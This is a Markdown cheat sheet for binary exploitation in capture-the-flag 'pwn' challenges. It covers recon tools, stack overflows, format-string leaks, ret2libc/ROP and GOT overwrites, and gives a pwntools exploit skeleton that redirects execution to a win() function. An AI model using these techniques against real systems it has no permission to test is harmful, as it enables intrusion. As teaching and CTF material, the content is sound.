# Binary Exploitation (pwn)

> Signals: binary elf exploit overflow buffer stack canary rop ret2libc ret2win format string got plt shellcode pwntools gdb ghidra segfault crash gets strcpy leak gadget one_gadget.

## Recon
- `checksec --file=./bin` (or pwntools `checksec`) — RELRO, Canary, NX, PIE.
- `file ./bin`, `strings ./bin`, `nm ./bin`, `objdump -d ./bin`.
- Decompile in Ghidra / IDA / Binary Ninja to find `main`, `win`, unsafe calls.
- Look for `gets`, `strcpy`, `sprintf`, `read` with large size, `printf(user_input)`.

## Classic vulnerability classes
- **Stack buffer overflow:** overwrite saved return address. Find offset with a
  cyclic pattern: `cyclic 200` then `cyclic -l <value>` after the crash.
- **ret2win:** overflow to redirect execution to a `win()`/`system("/bin/sh")` gadget.
- **Format string:** `printf(buf)` with attacker-controlled `buf` → leak with `%p`/`%x`,
  arbitrary write with `%n`. Find offset with `AAAA.%p.%p.%p`.
- **ret2libc / ROP:** no `win()`? Chain gadgets to call `system("/bin/sh")`. Leak a
  libc address (e.g. via `puts(puts@got)`), compute base, use one-gadget or `system`.
- **GOT overwrite:** with a write primitive, overwrite a GOT entry to hijack control.

## pwntools skeleton
```python
from pwn import *
context.binary = elf = ELF('./bin')
libc = ELF('./libc.so.6')
p = process('./bin')          # or remote('host', 1337)
offset = 40                    # from cyclic
rop = ROP(elf)
payload = flat({offset: [rop.find_gadget(['ret'])[0], elf.sym.win]})
p.sendline(payload)
p.interactive()
```

## Leaking libc (ret2libc)
1. `puts(puts@got)` to leak libc address of `puts`.
2. `libc.address = leak - libc.sym.puts`.
3. Second stage: `system(binsh)` with `libc.sym.system`, `next(libc.search(b'/bin/sh'))`.

## Tools
pwntools, GDB + pwndbg/GEF, Ghidra, ROPgadget, one_gadget, checksec, patchelf,
ropper, angr (symbolic execution for constraint-driven inputs).
